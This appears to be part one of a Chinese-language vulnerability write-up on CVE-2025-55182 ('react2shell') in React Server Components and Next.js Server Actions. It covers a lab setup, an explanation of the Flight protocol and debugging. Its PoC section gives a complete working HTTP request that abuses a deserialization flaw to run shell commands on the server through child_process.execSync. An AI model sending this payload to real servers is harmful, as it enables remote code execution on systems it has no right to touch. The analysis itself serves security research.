#  react2shell漏洞分析(一)  
原创 k
                    k  漏洞推送   2026-10-16 06:54  
  
漏洞编号: CVE-2025-55182  
## 环境搭建  
  
创建react环境  
  
1pnpx create-next-app@15.0.3 cve-2025-55182  
  
2Packages: +1  
  
3+  
  
4Progress: resolved 1, reused 0, downloaded 1, added 1, done  
  
5✔ Would you like to use TypeScript? … No / Yes  
  
6✔ Would you like to use ESLint? … No / Yes  
  
7✔ Would you like to use Tailwind CSS? … No / Yes  
  
8✔ Would you like your code inside a `src/` directory? … No / Yes  
  
9✔ Would you like to use App Router? (recommended) … No / Yes (重点，要选择yes)  
  
10✔ Would you like to use Turbopack for next dev? … No / Yes  
  
11✔ Would you like to customize the import alias (@/* by default)? … No / Yes  
  
12✔ What import alias would you like configured? … @/*  
  
13Creating a new Next.js app in /Users/k/Desktop/cve-2025-55182.  
  
14   
  
15Using pnpm.  
  
16   
  
17Initializing project with template: app-tw  
  
18   
  
19   
  
20Installing dependencies:  
  
21- react  
  
22- react-dom  
  
23- next  
  
24   
  
25Installing devDependencies:  
  
26- typescript  
  
27- @types/node  
  
28- @types/react  
  
29- @types/react-dom  
  
30- postcss  
  
31- tailwindcss  
  
32- eslint  
  
33- eslint-config-next  
  
34   
  
35   
  
36   ╭─────────────────────────────────────────╮  
  
37   │                                         │  
  
38   │   Update available! 10.33.2 → 11.1.2.   │  
  
39   │   Changelog: https://pnpm.io/v/11.1.2   │  
  
40   │    To update, run: pnpm self-update     │  
  
41   │                                         │  
  
42   ╰─────────────────────────────────────────╯  
  
43   
  
44 WARN  deprecated next@15.0.3: This version has a security vulnerability. Please upgrade to a patched version. See https://nextjs.org/blog/CVE-2025-66478 for more details.  
  
45 WARN  deprecated eslint@8.57.1: This version is no longer supported. Please see https://eslint.org/version-support for other options.  
  
46Downloading next@15.0.3: 24.75 MB/24.75 MB, done  
  
47Downloading @next/swc-darwin-x64@15.0.3: 42.13 MB/42.13 MB, done  
  
48 WARN  5 deprecated subdependencies found: @humanwhocodes/config-array@0.13.0, @humanwhocodes/object-schema@2.0.3, glob@7.2.3, inflight@1.0.6, rimraf@3.0.2  
  
49Packages: +354  
  
50++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  
  
51Progress: resolved 401, reused 286, downloaded 73, added 354, done  
  
52   
  
53dependencies:  
  
54+ next 15.0.3 (16.2.5 is available) deprecated  
  
55+ react 19.0.0-rc-66855b96-20241106 (19.2.6 is available)  
  
56+ react-dom 19.0.0-rc-66855b96-20241106 (19.2.6 is available)  
  
57   
  
58devDependencies:  
  
59+ @types/node 20.19.41 (25.9.0 is available)  
  
60+ @types/react 18.3.28 (19.2.14 is available)  
  
61+ @types/react-dom 18.3.7 (19.2.3 is available)  
  
62+ eslint 8.57.1 (10.4.0 is available) deprecated  
  
63+ eslint-config-next 15.0.3 (16.2.5 is available)  
  
64+ postcss 8.5.14  
  
65+ tailwindcss 3.4.19 (4.3.0 is available)  
  
66+ typescript 5.9.3 (6.0.3 is available)  
  
67   
  
68╭ Warning ───────────────────────────────────────────────────────────────────────────────────╮  
  
69│                                                                                            │  
  
70│   Ignored build scripts: sharp@0.33.5, unrs-resolver@1.11.1.                               │  
  
71│   Run "pnpm approve-builds" to pick which dependencies should be allowed to run scripts.   │  
  
72│                                                                                            │  
  
73╰────────────────────────────────────────────────────────────────────────────────────────────╯  
  
74Done in 12.1s using pnpm v10.33.2  
  
75Initialized a git repository.  
  
76   
  
77Success! Created cve-2025-55182 at /Users/k/Desktop/cve-2025-55182  
  
78   
  
79A new version of `create-next-app` is available!  
  
80You can update by running: pnpm add -g create-next-app  
## Poc  
  
1POST http://192.168.3.106:3000/ HTTP/1.1  
  
2Host: 192.168.3.106:3000  
  
3Next-Action: x  
  
4Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad  
  
5Content-Length: 757  
  
6   
  
7------WebKitFormBoundaryx8jO2oVc6SWP3Sad  
  
8Content-Disposition: form-data; name="0"  
  
9   
  
10{  
  
11  "then": "$1:__proto__:then",  
  
12  "status": "resolved_model",  
  
13  "reason": -1,  
  
14  "value": "{\"then\":\"$B1337\"}",  
  
15  "_response": {  
  
16    "_prefix": "var res=process.mainModule.require('child_process').execSync('pwd').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",  
  
17    "_chunks": "$Q2",  
  
18    "_formData": {  
  
19      "get": "$1:constructor:constructor"  
  
20    }  
  
21  }  
  
22}  
  
23------WebKitFormBoundaryx8jO2oVc6SWP3Sad  
  
24Content-Disposition: form-data; name="1"  
  
25   
  
26"$@0"  
  
27------WebKitFormBoundaryx8jO2oVc6SWP3Sad  
  
28Content-Disposition: form-data; name="2"  
  
29   
  
30[]  
  
31------WebKitFormBoundaryx8jO2oVc6SWP3Sad--  
  
![PixPin_2026-05-18_22-51-01](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jQwkzezUrM9ibib5L6ytZOw0ydFNPm3L9uGicjRibB7IbMy0HpmdQBRvJV5o4oEa4XKspxqp7HW9Y6ZhHJ8OcDHxVtDszwg1BHkPz7oAeugIibrE/640?wx_fmt=other&from=appmsg "null")  
## 漏洞分析  
  
该漏洞的根本原因在于，RSC 专有的 **Flight 协议**  
在反序列化客户端传入的 HTTP 请求 Payload 时，未对数据结构进行严格校验。攻击者可以通过构造特殊的“Thenable”（带有 then  
 方法的对象）多部分表单请求，劫持内部的 Promise 解析流程，最终通过 JavaScript 原型链构造出类似 eval  
 的执行环境（利用 Function  
 构造函数），在 Node.js 服务端执行任意命令。  
  
那么RSC是什么组件，是为了解决什么问题呢？  
  
在RSC出现之前，只有CSR客户端渲染和SSR渲染。  
  
CSR渲染js是完全运行在浏览器上，无法访问数据库等后端api。并且要下载全量的js包，首页会白屏。  
  
SSR渲染，服务器渲染完成以后把首屏页面发送给客户端，但是一旦页面交互起来，要刷新某一部分数据，传统做法通常需要重新请求 API 并使用客户端组件刷表，或者刷新整个页面（导致用户之前在输入框写的内容、滚动的距离全部丢失)  
  
RSC将同时结合了RSC和CSR。  
  
在访问首屏的时候RSC 组件，生成描述 UI 的 Flight 数据流，然后翻译为html，返回给客户端。  
  
后续在页面上的操作，就是返回 Flight 数据流，不再翻译为html，然是让客户端直接根据flight渲染。  
  
如果在页面操作时把 Flight 翻译成 HTML 扔给前端，前端就必须粗暴地用 innerHTML  
 替换页面，这会导致用户**正在输入的输入框失去焦点、正在播放的视频断掉、正在执行的动画卡死**  
。  
  
而直接返回 **Flight 数据流**  
，React 就能在前端进行 Virtual DOM 的 **Diff 算法对比**  
。它只更新该变的地方，而用户的输入框焦点、视频播放状态、动画进度**全部完好无损地保留了下来**  
。  
  
相当于在js html之间又引入了一个Flight的中间层。  
  
但是到目前为止RSC这个过程中服务端是发送者。浏览器是接受者。  
  
服务器完全不需要接受RSC数据。也就根本不会触发漏洞了。  
  
但是因为next有一种叫作Server Actions  
的机制所以导致了next实现了双向的Flight通信。  
  
在传统的全栈应用中，前端向后端提交数据（比如提交表单、点赞）是用 AJAX 发送一个 JSON。  
  
但在 RSC 架构中，React 希望前端能够**直接调用**  
后端的函数。  
## Server Actions  
  
我们来实现一个最简单的 Server Actions  
  
1// src/app/actions.ts  
  
2   
  
3"use server";  
  
4   
  
5export async function myAction() {  
  
6    console.log("myAction")  
  
7}  
  
1// src/app/test/page.tsx  
  
2   
  
3import { myAction } from "../actions";  
  
4   
  
5export default function TestPage(){  
  
6    return (  
  
7        <form action={myAction}>  
  
8            <button>test</button>  
  
9        </form>  
  
10    );  
  
11}  
  
1<form action="" enctype="multipart/form-data" method="POST">  
  
2    <input type="hidden" name="$ACTION_ID_00318330ebf1472740c411f5216c7fa0bd2e482c79">  
  
3    <button>test</button>  
  
4</form>  
  
点击以后就会产生RSC包  
  
1POST http://192.168.3.106:3000/test HTTP/1.1  
  
2Host: 192.168.3.106:3000  
  
3Content-Length: 281  
  
4Next-Action: 00318330ebf1472740c411f5216c7fa0bd2e482c79  
  
5User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36  
  
6Accept: text/x-component  
  
7DNT: 1  
  
8Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAWvYTivBrXBoIA6h  
  
9Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22test%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Ftest%22%2C%22refresh%22%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D  
  
10Origin: http://192.168.3.106:3000  
  
11Referer: http://192.168.3.106:3000/test  
  
12Accept-Encoding: gzip, deflate  
  
13Accept-Language: zh-CN,zh;q=0.9  
  
14Connection: close  
  
15   
  
16------WebKitFormBoundaryAWvYTivBrXBoIA6h  
  
17Content-Disposition: form-data; name="1_$ACTION_ID_00318330ebf1472740c411f5216c7fa0bd2e482c79"  
  
18   
  
19   
  
20------WebKitFormBoundaryAWvYTivBrXBoIA6h  
  
21Content-Disposition: form-data; name="0"  
  
22   
  
23["$K1"]  
  
24------WebKitFormBoundaryAWvYTivBrXBoIA6h--  
  
但是在这个例子中还是没有体现出Flight协议的必要性，在这个例子中我用AJAX请求一样可以完成。  
  
所以我们现在换一个复杂一点的例子  
  
1// src/app/actions.ts  
  
2   
  
3"use server";  
  
4import { revalidatePath } from "next/cache";  
  
5   
  
6let productDatabase = { id: "p123", name: "键盘", likes: 10, stock: 5 }  
  
7   
  
8export async function myAction(clientData: { userId: string, timestamp: Date }) {  
  
9    console.log("recive:", clientData)  
  
10    productDatabase.likes += 1  
  
11    productDatabase.stock -= 1  
  
12    revalidatePath("/test")  
  
13    return { success: true, updatedLikes: productDatabase.likes };  
  
14}  
  
15   
  
16export async function getProductData() {  
  
17    return productDatabase;  
  
18}  
  
1// src/app/test/page.tsx  
  
2import { getProductData } from "../actions";  
  
3import LikeButton from "./LikeButton";  
  
4   
  
5export default async function ProductPage() {  
  
6    // 直接在服务端读数据库  
  
7    const product = await getProductData();  
  
8   
  
9    return (  
  
10        <div style={{ padding: "2rem", fontFamily: "sans-serif" }}>  
  
11            <h1>{product.name}</h1>  
  
12            {/* 🚨 注意看这里：页面的状态显示完全依赖服务端的 product 数据 */}  
  
13            <p>实时剩余库存: <strong style={{color: "red"}}>{product.stock}</strong></p>  
  
14            <p>总点赞数: {product.likes}</p>  
  
15   
  
16            {/* 把服务端函数和数据传递给客户端交互组件 */}  
  
17            <LikeButton />  
  
18        </div>  
  
19    );  
  
20}  
  
1// src/app/test/LikeButton.tsx  
  
2   
  
3"use client";  
  
4   
  
5import { myAction } from "../actions";  
  
6   
  
7export default function LikeButton() {  
  
8    const handleLike = async () => {  
  
9        // 🚨 传递一个包含 Date 对象的复杂 JS 结构  
  
10        const payload = {  
  
11            userId: "user_999",  
  
12            timestamp: new Date() // JSON 是不支持原生传 Date 对象的，但 Flight 支持  
  
13        };  
  
14   
  
15        // 直接调用后端函数  
  
16        await myAction(payload);  
  
17    };  
  
18   
  
19    return (  
  
20        <button onClick={handleLike} style={{ padding: "0.5rem 1rem", cursor: "pointer" }}>  
  
21            👍 为它点赞  
  
22        </button>  
  
23    );  
  
24}  
  
在这个例子中，如果点击了按钮，页面上的数量也会即使渲染刷新。如果在传统的ajax写法或者前端框架的写法，需要先ajax数据，然后把数据赋值给双向绑定的变量。  
  
而Server Actions写法上看起来是全栈伪双向绑定好像是直接把服务端上的变量双向绑定到了浏览器页面上，这就是RSC的核心作用之一。  
  
RSC的本质就是将js函数分为了服务端函数和浏览器函数，客户端渲染，如果要渲染一个markdown文章，浏览器下载全部js。服务端渲染，则是服务器吃下了全部的渲染压力，浏览器直接来拿html结果。RSC，浏览器把markdown发给服务器，服务器计算好以后发送Flight数据，然后浏览器创建 DOM 节点、自己去刷显卡画面。把渲染工作转移到浏览器了。  
## RSC协议分析  
  
1POST http://192.168.3.106:3000/test HTTP/1.1  
  
2Host: 192.168.3.106:3000  
  
3Content-Length: 64  
  
4Pragma: no-cache  
  
5Cache-Control: no-cache  
  
6Next-Action: 4011b17458be1a3f255ea832519f6d44c36ace9532  
  
7User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36  
  
8Accept: text/x-component  
  
9DNT: 1  
  
10Content-Type: text/plain;charset=UTF-8  
  
11Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22test%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Ftest%22%2C%22refresh%22%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D  
  
12Origin: http://192.168.3.106:3000  
  
13Referer: http://192.168.3.106:3000/test  
  
14Accept-Encoding: gzip, deflate  
  
15Accept-Language: zh-CN,zh;q=0.9  
  
16Connection: close  
  
17   
  
18[{"userId":"user_999","timestamp":"$D2026-06-03T16:19:00.989Z"}]  
  
Next-Action: 服务器函数对应的唯一id  
  
Next-Router-State-Tree: **告诉服务器你（客户端浏览器）当前正停留在页面的哪个位置，以及你本地缓存了哪些路由节点。**  
 服务器拿到这棵“树”后，就能精准地知道该为你计算并返回哪一部分的 **Flight 数据流**  
，从而避免重复渲染没变的地方。  
  
Next-Action:机制同样也不可避免的引入了两个潜在攻击面  
  
1.  
Next-Action id泄露因为，因为需要在客户端发送id所以，这个id必须要写入到js文件中。可能会存在action校验不严格导致的未授权访问风险  
2.  
参数的传递不可避免的会有序列化和反序列化。  
  
![PixPin_2026-06-07_22-36-51](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jQwkzezUrM9nv1jdQjqdBoaLl7EKibc6YLNiajhF2a15ibn9N1veSRNF6VQBXTaxibJyJtdnjyWicEvyRlKWuwl6ic1g4RPk6NUmjYwQP82NU5MQA/640?wx_fmt=other&from=appmsg "null")  
  
但是next官方显然也考虑到了这个问题，做了function name混淆和按需加载，必须要访问到test页面，这个js才会被加载，才能获取到这个id。  
## 漏洞分析  
  
了解漏洞的大概原理之后，就是如何寻找漏洞文件了。我刚开始想的是execSync  
函数下断点，然后使用poc触发函数，通过调用堆栈来漏洞的触发位置。  
  
但是因为node的异步机制，将堆栈抹掉了。  
  
![PixPin_2026-06-09_21-53-55](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jQwkzezUrMicv0RPUDf7KTzLVyuu0aXYzia9mXUicdUTsCy6ZFR5oHepWSmK8icQ4HKXXqBsZSMwuME4VXYLng0krwqnKwLLlEtd7SXbibZn2qxU/640?wx_fmt=other&from=appmsg "null")  
  
最后还是看phith0n的文章，可以用捕获异常，然后发送不正确的json包来触发异常，找到漏洞点  
  
vscode调试配置.vscode/launch.json  
  
1{  
  
2  "version": "0.2.0",  
  
3  "configurations": [  
  
4    {  
  
5      "name": "Next.js: debug server (RSC internals, Turbopack)",  
  
6      "type": "node",  
  
7      "request": "launch",  
  
8      "cwd": "${workspaceFolder}",  
  
9      "runtimeExecutable": "node",  
  
10      "runtimeArgs": [  
  
11        "--enable-source-maps",  
  
12        "--stack-trace-limit=1000",  
  
13        "--trace-uncaught",  
  
14        "--trace-warnings",  
  
15        "--async-stack-traces",  
  
16        "${workspaceFolder}/node_modules/next/dist/bin/next",  
  
17        "dev",  
  
18        "--turbopack"  
  
19      ],  
  
20      "console": "integratedTerminal",  
  
21      "autoAttachChildProcesses": true,  
  
22      "skipFiles": [],  
  
23      "sourceMaps": true,  
  
24      "smartStep": false,  
  
25      "showAsyncStacks": true,  
  
26      "outputCapture": "std",  
  
27      "resolveSourceMapLocations": [  
  
28        "${workspaceFolder}/**",  
  
29        "${workspaceFolder}/node_modules/next/dist/**/*.map",  
  
30        "${workspaceFolder}/node_modules/next/dist/compiled/**/*.map"  
  
31      ]  
  
32    }  
  
33  ]  
  
34}  
  
勾选  
  
![PixPin_2026-06-11_21-57-25](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jQwkzezUrM9CSHo1CLsYicPsztoytpruyfu5G9H6pyOPqYbvxLJpVDibyMUkHR1YZnS4IXt6M8zrQrZicicrJCLLed38ic2osEM3z7aq9Zm3CNBU/640?wx_fmt=other&from=appmsg "null")  
  
断点位置  
  
![PixPin_2026-06-11_21-58-22](https://mmbiz.qpic.cn/mmbiz_jpg/jQwkzezUrM9fdE9dnaAibCtUE8wrz1aXrr8A77YazonVkRw1Acn60GYNpvkxOAc8ibMsNXksJdEsyiaNJxYgkD0HZQpBOD6rjoayUB2l9ZG258/640?wx_fmt=other&from=appmsg "null")  
  
  
